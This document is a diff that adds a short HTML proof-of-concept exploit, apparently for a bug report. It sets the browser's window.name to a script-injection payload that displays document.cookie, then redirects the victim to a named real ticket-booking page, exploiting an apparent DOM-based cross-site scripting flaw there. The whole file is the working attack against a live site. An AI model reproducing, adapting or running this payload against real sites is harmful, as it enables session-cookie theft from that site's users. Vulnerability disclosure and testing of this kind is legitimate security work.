@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // 1. Set the persistent window.name property
+        window.name = "'-alert(document.cookie)-'";
+        
+        // 2. Redirect the victim to the vulnerable page in the same tab
+        window.location = "https://www.district.in/events/ipl-ticket-booking";
+    </script>
+</body>
+</html>
